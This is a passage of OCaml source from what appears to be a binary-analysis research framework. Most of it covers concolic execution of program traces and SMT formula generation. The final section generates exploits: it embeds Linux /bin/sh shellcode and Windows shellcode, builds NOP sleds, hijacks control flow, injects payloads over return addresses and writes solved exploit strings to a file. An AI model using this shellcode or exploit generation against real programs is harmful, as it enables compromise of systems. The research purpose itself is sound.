    (*   let eax = evalf (Var Disasm_i386.eax) in *)
    (*   (match eax with *)
    (*   | Int(i, _) -> *)
    (*     Syscall_models.linux_syscall_to_il (Big_int.int_of_big_int i) *)
    (*   | _ -> failwith "Unexpected evaluation problem") *)
    | s -> [s] in
  let s =
    if not !allow_symbolic_indices && not (is_true !exp) then
      (* The assertion must come first, since the statement may modify value of 
         the expression! *)
      s @ [Assert(!exp, [])]
    else
      s
  in List.filter (fun s -> (List.mem dontkeepattr (get_attrs s)) = false) s

let rec get_next_label blocks =
  match blocks with
        | block::remaining ->
          let addr, block = hd_tl block in
          (try
                (match addr with
                  | Label (Addr a,_) -> Some(a)
                  | _ -> get_next_label remaining)
          with
                |       Failure _ -> None)
        | [] -> None

(** Running each block separately *)
let run_block arch ?(next_label = None) ?(transformf = (fun s _ -> [s])) state memv thread_map block =  
  (* Search for metadata.  It will either be a comment with endseed or a label
      with a context attribute.  If found update_concrete on that stmt, and if 
      it was a label set addr to that; execute the block.  If it's not found
      verify that all stmts are labels and comments.  Otherwise print a warning 
  *)
  let tid = get_tid block in
  let is_context = function | Context _ -> true | _ -> false in
  let addr =
    match block with
    | Comment (s,atts) as stmt::_ when is_seed_label s -> Some stmt
    | Label (_,atts) as stmt::_ when List.exists is_context atts -> Some stmt
    | _ -> dprintf "ignoring block %d" !counter; None
  in
  counter := !counter + 1;

  let block = match addr with
    | None -> dprintf "Running block: %d" !counter; block
    | Some addr -> dprintf "Running block: %d %s" !counter (Pp.ast_stmt_to_string addr);
      List.filter (fun b -> if b == addr then false else true) block
  in

  (* Call this function if we have a real block. A "fake" block is one
     that consists of a bunch of trace specials. *)
  let f block addr =

    let input_seeds, input_seeds_concrete = get_symbolic_seeds arch memv addr in
    let () = ignore(update_concrete addr) in

    if not !consistency_check then (
      (* If we are not doing a consistency check, there's no reason to
         keep delta around. cleanup_delta completely clears delta *)
      TraceConcrete.cleanup_delta state
    ) else (
      (* remove temps *)
      clean_delta state.delta;
      state.delta <- check_delta state tid;
      (* TraceConcrete.print_values state.delta;  *)
      (* TraceConcrete.print_mem state.delta;  *)
      (* dprintf "Reg size: %d Mem size: %d" (TraceConcrete.num_values state.delta) (TraceConcrete.num_mem_locs state.delta);*)

      (* Find the registers this block overwrites, and then mark this
         instruction as being the most recent to write them. 

         Note: This must come after check_delta
      *)
      let get_counter () =
        let c = !current_time in
        incr current_time;
        c
      in
      List.iter
        (function
          | Move(v, _, _) ->
            (* An explicit assignment *)
            if not (is_temp v) then
              Hashtbl.replace reg_to_stmt (v,tid) {assignstmt=addr; assigned_time=get_counter ()}
          | Special _ as s when Syscall_models.x86_is_system_call s ||
              Disasm.is_decode_error s ->
                (* A special could potentially overwrite all registers *)
                last_time := get_counter();
                last_special := addr;
          | _ -> ())
        block;
    );

    (* Don't execute specials now that we've potentially recorded them *)
    let block = remove_specials block in

    (* Assign concrete values to regs/memory *)
    let block =
      let assigns = assign_vars arch memv (lookup_thread_map thread_map tid) false in
      (* List.iter *)
      (*   (fun stmt -> dprintf "assign stmt: %s" (Pp.ast_stmt_to_string stmt)) assigns;       *)
      assigns @ input_seeds_concrete @ block
    in

    let block = append_halt block in
    TraceConcrete.initialize_prog state block;
    clean_delta state.delta;
    let executed = ref [] in
    executed := BatList.append input_seeds !executed;
    let rec eval_block state =
      let stmt = TraceConcrete.inst_fetch state.sigma state.pc in
      (* pdebug ("Executing: " ^ (Pp.ast_stmt_to_string stmt)); *)
      (* Hashtbl.iter (fun k v -> pdebug (Printf.sprintf "%Lx -> %s" k (Pp.ast_exp_to_string v))) concrete_mem ; *)
      let evalf e = match TraceConcrete.eval_expr state.delta e with
        | Symbolic(e) -> e
        | _ -> failwith "Expected symbolic"
      in
      executed := BatList.append (transformf stmt evalf) !executed ; 
      (*print_endline (Pp.ast_stmt_to_string stmt) ;*)

      (* If we have a system call, run the model instead.

         HACK: This is a pretty ugly hack.
      *)
      if Syscall_models.x86_is_system_call stmt then
        let rax = evalf (Var (Syscall_models.syscall_reg arch)) in
        let stmts = (match rax with
          | Int(i, _) ->
            Syscall_models.linux_syscall_to_il arch (int_of_big_int i)
          | _ -> failwith "Unexpected evaluation problem") in
        (* Hack: Remember the next pc; we will clobber this *)
        let newpc = succ_big_int state.pc in
        let newstate = List.fold_left
          (fun state stmt ->
	    let isspecial = match stmt with Special _ -> true | _ -> false in
            if isspecial then state else
              match TraceConcrete.eval_stmt state stmt with
              | x::[] -> x
              | _ -> failwith "expected one state") state stmts in
        eval_block {newstate with pc=newpc}
      else
        try
          (match TraceConcrete.eval_stmt state stmt with
	  | [newstate] ->
	    (* let next = TraceConcrete.inst_fetch newstate.sigma newstate.pc in *)
	    (*pdebug ("pc: " ^ (Int64.to_string newstate.pc)) ;*)
	    eval_block newstate
	  | _ ->
	    failwith "multiple targets..."
          )
        with
        (* Ignore failed assertions -- assuming that we introduced them *)
        | TraceConcrete.AssertFailed _ as _e ->
	  wprintf "failed assertion: %s" (Pp.ast_stmt_to_string stmt);
	  (* raise e; *)
	  let new_pc = succ_big_int state.pc in
	  eval_block {state with pc=new_pc}
    in
    try
      eval_block state
    with
      | Failure s as e ->
          Printexc.print_backtrace stderr; flush stderr;
          pwarn ("block evaluation failed :(\nReason: "^s) ;
          List.iter (fun s -> pdebug (Pp.ast_stmt_to_string s)) block ;
          (*if !consistency_check then ( *)
            raise e
          (* ) else
          ((addr,false)::(List.tl !executed)) *)
      | TraceConcrete.UnknownLabel lab ->
        (match next_label, lab with
        | Some(l), Addr x when x <>% l && !checkall ->
          let s =
            Printf.sprintf "Unknown label address (0x%s) does not equal the next label (0x%s)" (~% x) (~% l) in
          pwarn (s ^ "\nCurrent block is: " ^ (Pp.ast_stmt_to_string addr))
        | _ -> ()
        );
        (addr::List.rev (!executed))
      | TraceConcrete.Halted (_,ctx)-> 
          (*if (!checkall) then
            (match next_label with
          (* XXXSW use pc(?) to reverse lookup label in lambda *)
          (* XXXSW compare this to next_label and warn if not equal *)
            | Some(l) -> 
            let f hash_label hash_addr = 
            pwarn ("XXXSW Halt label = " ^ (Pp.label_to_string hash_label));
            pwarn (Printf.sprintf "XXXSW Halt addr = 0x%Lx" hash_addr);
            
            in
            let s sigma_addr sigma_stmt =
            pwarn ("XXXSW Sigma stmt = " ^ (Pp.ast_stmt_to_string sigma_stmt));
            pwarn (Printf.sprintf "XXXSW Sigma addr = 0x%Lx" sigma_addr);
            in
            pwarn ("Current block is: " ^ (Pp.ast_stmt_to_string addr));
            pwarn (Printf.sprintf "XXXSW Halt pc = 0x%Lx" state.pc);
            pwarn (Printf.sprintf "XXXSW Halt next_label = 0x%Lx" l);

          (* label_decode state.lambda next_label *)
            Hashtbl.iter f state.lambda;
            Hashtbl.iter s state.sigma;
            pwarn ("XXXSW Context from Halted");
            Hashtbl.iter f ctx.lambda;
            Hashtbl.iter s ctx.sigma;
            
            | None -> ());*)
        (addr::List.rev (List.tl !executed)) in

  match addr with
  | Some addr -> f block addr
  | None -> []

let run_blocks arch blocks memv length =
  counter := 1 ;
  Status.init "Concrete Run" length ;
  let state = TraceConcrete.create_state () in
  let thread_map = create_thread_map_state () in
  let (_,rev_trace,_) = List.fold_left 
    (fun (last_tid,acc,remaining) block -> 
      Status.inc();
      let hd, block_tail = hd_tl block in
      let concblock =
        (match hd with
        | Comment(s, _) when s=endtrace ->
          (* If the block starts with the endtrace comment, then we
             shouldn't concretely execute it. It's probably a bunch of
             assertions. *)
          let block = try explicit_thread_stmts_int last_tid block thread_map
            with Failure _ -> wprintf "No thread id found"; block
          in
          block
        | _ ->
          let l = get_next_label remaining in 
          let block = explicit_thread_stmts block thread_map in
          run_block arch ~next_label:l ~transformf:trace_transform_stmt state memv thread_map block)
      in
      (
        (* Save this threadid.  We'll use this when we get to the end
           of the trace. *)
        get_tid block,
        (* If we are doing a consistency check, saving the concretized
           blocks is just a waste of memory! *)
        (* new trace *) 
        (if !consistency_check then [] else List.rev_append concblock acc),
        (* remaining *) 
        (match remaining with
        | [] -> []
        | _::tl -> tl)
      ))
    (None,[],List.tl blocks) blocks
  in
  Status.stop () ;
  List.rev rev_trace

(** Convert a stmt to DSA form

    @param s The AST program to convert to DSA form
    @param h The map from original var names to most recent dsa var
    @param rh The map from a dsa var back to the original var
    @return The DSA'ified statement
*)
let to_dsa_stmt s h rh =
  let dsa_ctr = ref 0 in
  let new_name (Var.V(_,s,t) as v) =
    if is_symbolic v then v
    else (
      dsa_ctr := !dsa_ctr + 1;
      assert (!dsa_ctr <> 0);
      let s = Printf.sprintf "dsa_%s_%d" s !dsa_ctr in
      Var.newvar s t
      )
  in
  let replace_var v =
    let newv = new_name v in
    VH.add h v newv;
    VH.add rh newv v;
    newv
  in
  (* Rename all assigned vars *)
  let av = object(self)
    inherit Ast_visitor.nop
    method visit_avar v =
      ChangeTo (replace_var v)

    method visit_rvar v =
      try
        ChangeTo (VH.find h v)
      with Not_found ->
        dprintf "Unable to find %s during DSA: probably an input" (Var.name v);
        let nv = replace_var v in
        ChangeTo nv

    method visit_uvar v =
      VH.remove h v;
      DoChildren

  end
  in
  Ast_visitor.stmt_accept av s


(** Convert a trace to DSA form

    @param p The AST program to convert to DSA form
    @return A tuple of the DSA version of the program and a hash table
    mapping DSA vars to the original vars.

    @note Does not use DSA for 'mem'.
*)
let to_dsa p =
  (* Maps vars to their dsa name *)
  let h = VH.create 1000 in
  let rh = VH.create 1000 in
  let f stmt = to_dsa_stmt stmt h rh in
  (List.map f p, rh)




(** Perform concolic execution on the trace and
    output a set of constraints *)
let concrete arch trace = 
  dsa_rev_map := None;
  let trace = Memory2array.coerce_prog trace in
  (* let trace = remove_specials trace in *)
  (* let no_unknowns = remove_unknowns no_specials in *)
  let memv = find_memv trace in
  let blocks = trace_to_blocks trace in
  (*pdebug ("blocks: " ^ (string_of_int (List.length blocks)));*)
  let length = List.length blocks in
  let actual_trace = run_blocks arch blocks memv length in
    actual_trace

(* Normal concrete execution *)
module TaintConcreteDef =
struct
  include MemVHBackEnd
  include Symbeval.Symbolic

  let bytes = ref (Array.make 0 0)

  let conc2symb _ _ =
    failwith "No symbolics"

  let lookup_var delta (Var.V(_,s,t) as v) =
    try VH.find delta v
    with Not_found ->
      if is_symbolic v then (
        let n = (get_symb_num v) - 1 in
        try
          let byte = big_int_of_int ((!bytes).(n)) in
          Symbolic(Int(byte, t))
        with
          Invalid_argument _ -> 
            failwith ("Input outside of input file range: "^(string_of_int n)^
                         "/"^(string_of_int (Array.length !bytes)))
      ) else (
        dprintf "Variable %s not found" s;
        match t with
        | Reg _ ->
            Symbolic(Int(bi0, t))
        | TMem _ | Array _ ->
            empty_mem v
      )

  let lookup_mem mu index endian =
    let normalize = Symbeval.normalize in
    match mu, index with
    | ConcreteMem(m,v), Int(i,t) ->
        (try AddrMap.find (normalize i t) m
         with Not_found ->
           Int(bi0, reg_8)
             (* FIXME: handle endian and type? *)
        )
    | _ -> failwith "No symbolics"

end

module TaintConcrete = Symbeval.Make(TaintConcreteDef)(DontEvalSymbLet)(StdAssign)(StdForm)

(** Concretely execute a trace without using any operand information *)
let concrete_rerun file stmts =
  TaintConcreteDef.bytes := Array.of_list (bytes_from_file file);
  let length = List.length stmts in
  Status.init "Concretely Re-executing" length;
  let initctx = TaintConcrete.build_default_context stmts () in
  (try
     let step state =
       let () = Status.inc () in
       state
     in
     let _ = TaintConcrete.eval_straightline ~step:step initctx in
     failwith "Expected a single state"
   with
     TaintConcrete.Halted(v, ctx) -> Printf.printf "Halted successfully\n"
   | TaintConcrete.AssertFailed ctx ->
       let stmt = TaintConcrete.inst_fetch ctx.sigma ctx.pc in
       Printf.printf "Assertion failure at %s: %s\n" (~% (ctx.pc)) (Pp.ast_stmt_to_string stmt) ;
       clean_delta ctx.delta ;
       TaintConcrete.print_values ctx.delta;
       (* TaintConcrete.print_mem ctx.TaintConcrete.delta *)
   | Failure s -> Printf.printf "Failure: %s\n" s);

  Status.stop () ;

  stmts

(*************************************************************)
(********************  Concolic Execution  *******************)
(*************************************************************)

(* Assumptions for the concretization process to be sound:
   - We can have at most one memory load/store on each
   asm instruction
   - We are doing the lookups/stores in little-endian order
*)

(* A quick and dirty way to estimate the formula size *)
let formula_size formula =
  let rec size = function
    | Ast.Ite(_,e1,e2) -> bi1 +% (size e1) +% (size e2)
    | Ast.Extract(_,_,e) -> bi1 +% (size e)
    | Ast.Concat(el,er) -> bi1 +% (size el) +% (size er)
    | Ast.BinOp(_,e1,e2) -> bi1 +% (size e1) +% (size e2)
    | Ast.UnOp(_,e) -> bi1 +% size e
    | Ast.Var _ -> bi1
    | Ast.Lab _ -> bi1
    | Ast.Int (n,_) -> bi1
    | Ast.Cast (_, _, e) -> bi1 +% size e
    | Ast.Unknown _ -> bi1
    | Ast.Load (ea, ei,  _, _) -> bi1 +% (size ea) +% (size ei)
    | Ast.Store (ea, ei, ev, _, _) -> bi1 +% (size ea) +% (size ei) +% (size ev)
    | Ast.Let (_, el, eb) -> bi1 +% (size el) +% (size eb)
  in
    size formula


(** Symbolic assigns are represented as Lets in the formula, except
    for temporaries.  If you use this, you should clear out temporaries
    after executing each instruction.

    This should be exactly the same as Symbeval.PredAssign, except
    that when we call is_temp we need to use the non-dsa variable
    name.
*)
module PredAssignTraces(MemL: MemLookup)(Form: FlexibleFormula) =
struct
  let assign v ev ({delta=delta; pred=pred; pc=pc} as ctx) =
    dprintf "ev: %s" (Symbeval.symb_to_string ev);
    let is_worth_storing = (*is_concrete expr &&*)
      Disasm.is_temp (BatOption.get (dsa_var v))
    in
    let delta', pred' =
      if is_worth_storing then (dprintf "Storing %s in delta" (Var.name v);
                                (MemL.update_var delta v ev, pred))
      else
        let expr = match ev with
          | ConcreteMem (m,v) -> symb_to_exp (Symbeval.conc2symb m v)
          | Symbolic e -> e
        in
        let constr = BinOp (EQ, Var v, expr) in
        pdebug ((Var.name v) ^ " = " ^ (Pp.ast_exp_to_string expr)) ;
        let delta' = MemL.remove_var delta v in (* shouldn't matter because of dsa, but remove any old version anyway *)
        (delta', Form.add_to_formula pred constr Rename)
    in
    {ctx with delta=delta'; pred=pred'; pc=succ_big_int pc}
end

(** Modules that convert user_init data to a FlexibleFormula's init
    type *)
module type FormulaAdapter =
sig
  type user_init
  type form_init
  val adapt : user_init -> form_init
end

module type TraceSymbolic =
sig
  (* Formula types *)
  type user_init
  type init
  type output

  (* Symb. exec. state *)
  type state

  val create_state : user_init -> state
  (* Symbolically execute an entire trace at once *)
  val symbolic_run : user_init -> arch -> stmt list -> state
  (* Symbolically execute some blocks of a trace for streaming *)
  val symbolic_run_blocks : state -> arch -> stmt list -> state
  val generate_formula : user_init -> arch -> stmt list -> output
  val output_formula : state -> output

  (******************* Formula Debugging  **********************)
  val formula_valid_to_invalid : arch -> ?min:int -> stmt list -> unit
  val trace_valid_to_invalid : arch -> stmt list -> unit

  (****************  Exploit String Generation  ****************)
  val output_exploit : user_init -> arch -> stmt list -> unit
end


module MakeTraceSymbolic (Tune: EvalTune) (Assign: Assign) (FormAdapt: FormulaAdapter) (Form: FlexibleFormula with type init = FormAdapt.form_init) =
struct
  (* Set this to LetBindSimplify to use formula simplificiation *)
  module SymbolicEval = Symbeval.Make(SymbolicMemL)(Tune)(Assign)(Form)

  type user_init = FormAdapt.user_init
  type init = Form.init
  type output = Form.output
  type state = {symstate: SymbolicEval.myctx;
                h: Var.t Var.VarHash.t; rh: Var.t Var.VarHash.t (*dsa maps*)}

  let status = ref 0
  let count = ref 0

  let create_state i = {symstate=SymbolicEval.create_state (FormAdapt.adapt i);
                        h=VH.create 1000;
                        rh=VH.create 10000}

  let symbolic_run_block arch ({h; rh; symstate} as state) stmt =
    let to_dsa stmt = to_dsa_stmt stmt h rh in
    let stmts = ref [] in
    (* dprintf "Dsa'ified stmt: %s" (Pp.ast_stmt_to_string stmt); *)
    Status.inc() ;
    let hasconc = update_concrete stmt in
    if hasconc && !consistency_check then (
      stmts := !stmts @ [assert_vars arch h]
    );
    stmts := List.map to_dsa (BatList.append !stmts [stmt]);
    dprintf "Evaluating stmt %s" (Pp.ast_stmt_to_string stmt);
    (match stmt with
      | Ast.Label (_,atts) when filter_taint atts != [] ->
          (* Printf.printf "%s\n" ("block no: " ^ (string_of_int !status)); *)
          (* Printf.printf "%s\n" (Pp.ast_stmt_to_string stmt); *)
          (* We have a new block *)
          clean_delta symstate.delta;
          status := !status + 1 ;
      | _ -> ());

    (* Double fold since we may have to add an assertion *)
    let symstate = List.fold_left
      (fun state stmt ->
        match SymbolicEval.eval_stmt state stmt with
          | [next] -> next
          | _ -> failwith "Jump in a straightline program"
      ) symstate !stmts in
    {state with symstate}

  let symbolic_run_blocks state arch trace =
    try
      let trace = Hacks.replace_unknowns trace in
      let trace = remove_specials trace in
      let state = List.fold_left (symbolic_run_block arch) state trace in
      state
    with
      | Failure fail as e ->
          pdebug ("Symbolic Run Fail: "^fail);
          (*state.pred*)
          raise e
      | SymbolicEval.Halted (_,symstate) ->
          pdebug "Symbolic Run ... Successful!";
          {state with symstate}
      | SymbolicEval.AssertFailed _ as e ->
          pdebug "Failed assertion ..." ;
          (*state.pred*)
          raise e

  let symbolic_run userinit arch trace =
    Status.init "Symbolic Run" (List.length trace) ;
    let trace = append_halt trace in
    (*  VH.clear TaintSymbolic.dsa_map; *)
    cleanup ();
    let state = create_state userinit in
    dsa_rev_map := Some state.rh;
    (* Find the memory variable *)
    let memv = find_memv trace in
    dprintf "Memory variable: %s" (Var.name memv);
    let formula = symbolic_run_blocks state arch trace in
    Status.stop () ;
    dsa_rev_map := None;
    formula

  (*************************************************************)
  (********************  Formula Generation  *******************)
  (*************************************************************)
  let generate_formula i arch trace =
    let trace = concrete arch trace in
    (* If we leave DCE on, it will screw up the consistency check. *)
    let trace = match !consistency_check || (not !dce) with
      | true -> trace
      | false -> trace_dce trace
    in
    let finalstate = symbolic_run i arch trace in
    Form.output_formula finalstate.symstate.pred

  let output_formula state = Form.output_formula state.symstate.pred

end

(* User gives a filename and an SMT *)
type standard_user_init = string * Smtexec.smtexec

(* Extra stuff when user_init = standard_user_init *)
module MakeTraceSymbolicStandard (Tune: EvalTune) (Assign: Assign) (FormAdapt: FormulaAdapter with type user_init = standard_user_init) (Form: FlexibleFormula with type init = FormAdapt.form_init with type output = unit) =
struct

  module TraceSymbolic = MakeTraceSymbolic(Tune)(Assign)(FormAdapt)(Form)
  include TraceSymbolic

  (*************************************************************)
  (******************* Formula Debugging  **********************)
  (*************************************************************)
  (* Binary search over the concretized IL to check where things go
     wrong. *)
  let formula_valid_to_invalid arch ?(min=1) trace =
    let sym_and_output trace fname =
      let finalstate = symbolic_run (fname,Smtexec.STP.si) arch trace in
      Form.output_formula finalstate.symstate.pred;
    in
    let trace = concrete arch trace in
    (* If we leave DCE on, it will screw up the consistency check. *)
    let trace = match !consistency_check with
      | false -> trace_dce trace
      | true -> trace
    in
    let length = List.length trace in
    Printf.printf "Starting search: %d trace length\n" length;
    let rec bsearch l u =
      let open Smtexec in
      Printf.printf "Searching %d %d\n" l u ;
      if l >= u - 1 then (l,u)
      else
        let middle = (l + u) / 2 in
        let trace = BatList.take middle trace in
        try
          sym_and_output trace "temp";
          match STP.si#solve_formula_file ~getmodel:true "temp" with
            | Invalid _ -> Printf.printf "going higher\n";
                bsearch middle u
            | _ -> (Printf.printf "going lower\n";
                    bsearch l middle)
        with
          | Failure _ ->
              (Printf.printf "going lower\n";
               bsearch l middle)
          | TraceConcrete.UnknownLabel _
          | SymbolicEval.UnknownLabel _ ->
              (Printf.printf "going a little higher\n";
               bsearch l (u-1))
    in
    let (l,u) = bsearch min length in
    ignore (sym_and_output (BatList.take l trace) "form_val") ;
    ignore (sym_and_output (BatList.take u trace) "form_inv")

  (* Binary search over the trace IL to see where things go
     wrong. *)
  let trace_valid_to_invalid arch trace =
    let open Smtexec in
    let length = List.length trace in
    let rec bsearch l u =
      Printf.printf "Searching %d %d\n" l u ;
      if l >= u - 1 then (l,u)
      else
        let middle = (l + u) / 2 in
        let trace = BatList.take middle trace in
        try
          ignore (generate_formula ("temp",STP.si) arch trace) ;
          match STP.si#solve_formula_file ~getmodel:true "temp" with
            | Invalid _ -> Printf.printf "going higher\n";
                bsearch middle u
            | _ -> Printf.printf "going lower\n";
              bsearch l middle
        with
          | Failure _ ->
              (Printf.printf "going lower\n";
               bsearch l middle)
          | TraceConcrete.UnknownLabel _
          | SymbolicEval.UnknownLabel _ ->
              (Printf.printf "going a little higher\n";
               bsearch l (u-1))
    in
    let (l,u) = bsearch 1 length in
    ignore (generate_formula ("form_val",Smtexec.STP.si) arch (BatList.take l trace)) ;
    ignore (generate_formula ("form_inv",Smtexec.STP.si) arch (BatList.take u trace))


(*************************************************************)
(****************  Exploit String Generation  ****************)
(*************************************************************)

  let formula_storage = ".formula"
  let answer_storage = ".answer"

  let parse_answer_to model outfile =
    let var_vals = match model with
      | Some(x) -> x
      | None -> failwith "No model found"
    in
    (* The variables that we care about *)
    let is_input v = String.sub v 0 4 = "symb" in
    (* A special function to sort interesting variables by name *)
    let underscore = Str.regexp_string "_" in
    let split_var = Str.split underscore in
    let var_to_string_num var = List.nth (split_var var) 1 in
    let var_to_num var = int_of_string (var_to_string_num var) in
    let sort =
      let sort_aux (var1, _) (var2,_) =
        compare (var_to_num var1) (var_to_num var2)
      in
      List.sort sort_aux
    in
    (* Padding unused symbolic bytes *)
    let pad_unused =
      let rec pad n acc = function
        | [] -> List.rev acc
        | ((var,_) as first)::rest when var_to_num var = n ->
            pad (n+1) (first::acc) rest
        | ((var,_)::rest) as more ->
            assert ((var_to_num var) >= n);
            pad (n+1) (("",bi1)::acc) more
      in
      pad 1 []
    in
    let symb_var_vals = List.filter (fun (v,_) -> is_input v) var_vals in
    let sorted = sort symb_var_vals in
    let padded = if !padding then pad_unused sorted else sorted in
    let _, input = List.split padded in
    let input = List.map Big_int_Z.int_of_big_int input in
    (* Let's output the exploit string *)
    let cout = open_out outfile in
    List.iter (output_byte cout) input ;
    close_out cout;
    print "Exploit string was written out to file \"%s\"\n" outfile ;
    flush stdout

  let output_exploit (file,s) arch trace =
    generate_formula (formula_storage,s) arch trace;
    match s#solve_formula_file ~getmodel:true formula_storage with
    | Smtexec.Invalid m -> parse_answer_to m file
    | _ -> parse_answer_to None file
end

module StreamPrinterAdapter =
struct
  type user_init = standard_user_init
  type form_init = Symbeval.LetBindStreamSat.init
  let adapt ((file,smt):user_init) =
    file, smt#streaming_printer
end

module OldPrinterAdapter =
struct
  type user_init = standard_user_init
  type form_init = Formulap.fpp_oc
  let adapt ((file,smt):user_init) =
    let oc = open_out file in
    smt#printer oc
end


module TraceSymbolic =
  MakeTraceSymbolicStandard(DontEvalSymbLet)(PredAssignTraces)(OldPrinterAdapter)(LetBindFakeStream);;
module TraceSymbolicStream =
  MakeTraceSymbolicStandard(DontEvalSymbLet)(PredAssignTraces)(StreamPrinterAdapter)(LetBindStreamSat);;

(*************************************************************)
(********************  Exploit Generation  *******************)
(*************************************************************)

(* A simple shellcode *)
let shellcode =
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    ^ "\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

(* Windows shellcode to run an advanced math system *)
let winshellcode =
  "\xdb\xd6\xbf\x06\x5f\xcb\x1e\x2b\xc9\xb1\x33\xd9\x74\x24\xf4"
  ^  "\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x12\xbd\x3e\xe2\xf2\xc8"
  ^  "\xc1\x1b\x02\xab\x48\xfe\x33\xf9\x2f\x8a\x61\xcd\x24\xde\x89"
  ^  "\xa6\x69\xcb\x1a\xca\xa5\xfc\xab\x61\x90\x33\x2c\x44\x1c\x9f"
  ^  "\xee\xc6\xe0\x41\x22\x29\xd8\x2c\x37\x28\x1d\x50\xb7\x78\xf6"
  ^  "\x1e\x65\x6d\x73\x62\xb5\x8c\x53\xe8\x85\xf6\xd6\x2f\x71\x4d"
  ^  "\xd8\x7f\x29\xda\x92\x67\x42\x84\x02\x99\x87\xd6\x7f\xd0\xac"
  ^  "\x2d\x0b\xe3\x64\x7c\xf4\xd5\x48\xd3\xcb\xd9\x45\x2d\x0b\xdd"
  ^  "\xb5\x58\x67\x1d\x48\x5b\xbc\x5f\x96\xee\x21\xc7\x5d\x48\x82"
  ^  "\xf9\xb2\x0f\x41\xf5\x7f\x5b\x0d\x1a\x7e\x88\x25\x26\x0b\x2f"
  ^  "\xea\xae\x4f\x14\x2e\xea\x14\x35\x77\x56\xfb\x4a\x67\x3e\xa4"
  ^  "\xee\xe3\xad\xb1\x89\xa9\xbb\x44\x1b\xd4\x85\x46\x23\xd7\xa5"
  ^  "\x2e\x12\x5c\x2a\x29\xab\xb7\x0e\xc5\xe1\x9a\x27\x4d\xac\x4e"
  ^  "\x7a\x10\x4f\xa5\xb9\x2c\xcc\x4c\x42\xcb\xcc\x24\x47\x90\x4a"
  ^  "\xd4\x35\x89\x3e\xda\xea\xaa\x6a\xb9\x6d\x38\xf6\x10\x0b\xb8"
  ^  "\x9d\x6c\xd9"

let nop = '\x90'

let nopsled n = String.make n nop

(* TODO: find a way to determine PIN's offset *)
let pin_offset = 400L

(* The last jump of the trace *)
let get_last_jmp_exp stmts =
  let rev = List.rev stmts in
  let rec get_exp = function
    | [] -> failwith "no jump found"
    | (Ast.Jmp(e, atts))::rest ->
        ((e,atts), rest)
    | _::rest -> get_exp rest
  in
  let (exp, rev) = get_exp rev in
  let rev = Comment(endtrace, [])::rev in
    (exp, List.rev rev)

(* Substituting the last jump with assertions *)
let hijack_control target trace =
  let ((e, atts), trace) = get_last_jmp_exp trace in
  let ret_constraint = BinOp(EQ,e,target) in
  trace, Ast.Assert(ret_constraint, atts)

(* Setting the return address to an arbitrary value *)
let control_flow target arch trace =
  let target = Int(target, memtype arch) in
  let trace, assertion = hijack_control target trace in
    BatList.append trace [assertion]

(* Making the final jump target a symbolic variable. This
   should be useful for enumerating all possible jump targets *)
let limited_control arch trace =
  let target = Var (Var.newvar "s_jump_target" (memtype arch)) in
  let trace, assertion = hijack_control target trace in
    BatList.append trace [assertion]

(** Return the last load expression *)
let get_last_load_exp stmts =
  let rev = List.rev stmts in
  let rec get_load = function
    | [] -> failwith "no load found"
    | ((Ast.Move(_,Ast.Load(array,index,_,_),_))::rest) as rev ->
        (array,index, List.rev rev)
    | s::rest ->
        get_load rest
  in
  get_load rev

(** Injecting a payload at an exp

    XXX: Consolidate other payload functions to use this one.
*)
let inject_payload_gen arch addr payload trace =
  (* XXX: This is probably inefficient. *)
  let mem = Var(find_memv trace) in
  let payload = List.map big_int_of_int payload in
  let _,assertions =
    List.fold_left
      (fun (i,acc) value ->
         let index = Ast.BinOp(PLUS, addr, Int(i, memtype arch)) in
         let load = Ast.Load(mem, index, exp_false, reg_8) in
         let constr = Ast.BinOp(EQ, load, Int(value, reg_8)) in
         (succ_big_int i, (Ast.Assert(constr, [])::acc))
      ) (bi0, []) payload
  in
  List.rev assertions


(* Injecting a payload at an offset past the return address *)
let inject_payload arch start payload trace =
  (* TODO: A simple dataflow is missing here *)
  let mem, ind, _ = get_last_load_exp trace in
  dprintf "Injecting shellcode at index: %s" (Pp.ast_exp_to_string ind);
   (* Let's convert to Int64 *)
  let payload = List.map big_int_of_int payload in
  let _,assertions =
    List.fold_left
      (fun (i,acc) value ->
         let index = Ast.BinOp(PLUS, ind, Int(i, memtype arch)) in
         let load = Ast.Load(mem, index, exp_false, reg_8) in
         let constr = Ast.BinOp(EQ, load, Int(value, reg_8)) in
           (succ_big_int i, (Ast.Assert(constr, [])::acc))
      ) (start, []) payload
  in
    trace, List.rev assertions

(* Convert a string to a list of bytes *)
let string_to_bytes payload =
  let bytes = ref [] in
    String.iter
      (fun c -> bytes := ((int_of_char c)::!bytes)) payload ;
    List.rev !bytes

(* Add an arbitrary payload over the return address *)
let add_payload offset payload arch trace =
  let payload = string_to_bytes payload in
  let _, index, trace = get_last_load_exp trace in
  let start = BinOp(PLUS, index, Int(offset, memtype arch)) in
  let assertions = inject_payload_gen arch start payload trace in
    BatList.append trace assertions

let add_payload_after offset payload arch trace =
  let payload = string_to_bytes payload in
  let trace, assertions = inject_payload arch offset payload trace in
    BatList.append trace assertions

let add_payload_from_file offset file arch trace =
  let payload = bytes_from_file file in
  let _, index, trace = get_last_load_exp trace in
  let start = BinOp(PLUS, index, Int(offset, memtype arch)) in
  let assertions = inject_payload_gen arch start payload trace in
    BatList.append trace assertions

let add_payload_from_file_after offset file arch trace =
  let payload = bytes_from_file file in
  let trace, assertions = inject_payload arch offset payload trace in
    BatList.append trace assertions

exception Found_load of Ast.exp

(* Performing shellcode injection *)
let inject_shellcode nops arch trace =
  let payload = (nopsled nops) ^ winshellcode in
  (* Find the expression of the last loaded value *)
  let _,target_addr,_ = get_last_load_exp trace in
  let target_addr = BinOp(PLUS, target_addr, Int(bi4, memtype arch)) in
  (* let target_addr = Int64.add target_addr pin_offset in *)
  (* let target_addr = Int(target_addr, reg_32) in *)
  let _, assertion = hijack_control target_addr trace in
  let payload = string_to_bytes payload in
  let _, trace = get_last_jmp_exp trace in
  let trace, shell = inject_payload arch bi4 payload trace in
    BatList.append trace (shell @ [assertion])

(** Use pivot to create exploit *)
let add_pivot gaddr maddr payload arch trace =
  let gaddrexp = Int(gaddr, memtype arch) in
  let trace, assertion = hijack_control gaddrexp trace in
  (* Concatenate the assertion and the gadget IL *)
  let trace = BatList.append trace [assertion] in
  let passerts = inject_payload_gen arch (Int(maddr, memtype arch)) (string_to_bytes payload) trace in
  BatList.append trace passerts

(** Use pivot to create exploit *)
let add_pivot_file gaddr maddr payloadfile arch trace =
